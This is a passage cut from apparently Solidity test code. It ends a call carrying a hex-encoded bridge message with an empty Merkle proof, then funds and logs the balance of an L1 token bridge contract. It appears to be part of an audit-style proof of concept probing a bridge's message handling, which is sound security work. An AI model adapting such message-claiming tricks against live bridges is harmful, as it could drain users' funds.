            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );
 
        token.transfer(address(l1TokenBridge),900_000e18);
        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
        
    }
    
```
